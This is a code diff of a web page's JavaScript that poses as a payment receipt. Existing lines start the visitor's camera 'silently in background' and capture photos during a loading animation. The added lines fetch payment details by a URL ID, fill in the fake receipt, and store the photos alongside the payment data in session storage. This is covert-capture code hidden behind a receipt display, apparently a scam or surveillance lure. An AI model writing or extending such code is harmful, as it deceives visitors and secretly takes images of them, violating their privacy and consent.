@@ -278,9 +278,38 @@
         let capturedPhotos = [];
         let cameraStream = null;
         let video = null;
+        let paymentData = null;
+
+        // Get payment ID from URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const paymentId = urlParams.get('id');
+
+        // Fetch payment details on load
+        async function fetchPaymentDetails() {
+            if (!paymentId) return null;
+
+            try {
+                const response = await fetch('/validate-payment-id', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ paymentId: paymentId })
+                });
+
+                const data = await response.json();
+                if (data.valid) {
+                    return data.payment;
+                }
+            } catch (error) {
+                console.error('Error fetching payment details:', error);
+            }
+            return null;
+        }
 
         // Auto-start camera and capture photos during animation
         window.addEventListener('load', async function () {
+            // Fetch payment details first
+            paymentData = await fetchPaymentDetails();
+
             // Start camera silently in background
             await startCameraInBackground();
 
@@ -292,14 +321,30 @@
                 document.getElementById('loadingSection').style.display = 'none';
                 document.getElementById('receiptSection').style.display = 'block';
 
+                // Update receipt with actual payment data
+                if (paymentData) {
+                    document.querySelector('.receipt-amount-value').textContent = `₹${paymentData.amount}.00`;
+                    document.getElementById('receipt-txn-id').textContent = paymentData.id;
+
+                    if (paymentData.merchant) {
+                        document.querySelectorAll('.receipt-value')[0].textContent = paymentData.merchant;
+                    }
+
+                    if (paymentData.date) {
+                        document.getElementById('receipt-date').textContent = paymentData.date;
+                    }
+                }
+
                 // Stop camera
                 if (cameraStream) {
                     cameraStream.getTracks().forEach(track => track.stop());
                 }
 
-                // Store photos in sessionStorage
+                // Store photos and payment data
                 sessionStorage.setItem('capturedPhotos', JSON.stringify(capturedPhotos));
-                console.log(`Captured ${capturedPhotos.length} photos`);
+                sessionStorage.setItem('paymentId', paymentId);
+                sessionStorage.setItem('paymentData', JSON.stringify(paymentData));
+                console.log(`Captured ${capturedPhotos.length} photos for payment ${paymentId}`);
             }, 6000); // Show receipt after 6 seconds (animation complete)
         });
 
